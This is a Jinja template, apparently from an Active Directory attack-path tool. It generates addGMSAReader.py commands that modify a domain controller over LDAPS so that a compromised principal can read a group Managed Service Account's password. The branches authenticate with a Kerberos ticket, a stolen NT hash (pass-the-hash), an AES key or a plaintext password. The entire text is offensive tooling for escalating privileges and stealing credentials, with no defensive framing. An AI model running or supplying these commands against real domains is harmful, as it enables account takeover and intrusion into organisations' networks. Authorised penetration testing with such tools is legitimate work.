# Allow {{parent.obj.name}} to read the password of the service account {{target.name}}
{% if parent.krb_auth %}
./tools/addGMSAReader.py '{{fqdn}}/{{parent.obj.name}}'@{{dc_name}} -k -no-pass -use-ldaps -dc-ip {{dc_ip}} -t '{{target.name}}' -sid {{parent.obj.sid}}
{%- elif parent.secret_type == T_SECRET_NTHASH %}
./tools/addGMSAReader.py '{{fqdn}}/{{parent.obj.name}}'@{{dc_name}} -hashes :{{parent.secret|red}} -use-ldaps -dc-ip {{dc_ip}} -t '{{target.name}}' -sid {{parent.obj.sid}}
{%- elif parent.secret_type == T_SECRET_AESKEY %}
./tools/addGMSAReader.py '{{fqdn}}/{{parent.obj.name}}'@{{dc_name}} -k -no-pass -aesKey {{parent.secret|red}} -use-ldaps -dc-ip {{dc_ip}} -t '{{target.name}}' -sid {{parent.obj.sid}}
{%- elif parent.secret_type == T_SECRET_PASSWORD %}
./tools/addGMSAReader.py '{{fqdn}}/{{parent.obj.name}}:{{parent.secret|red}}'@{{dc_name}} -use-ldaps -dc-ip {{dc_ip}} -t '{{target.name}}' -sid {{parent.obj.sid}}
{%- endif %}
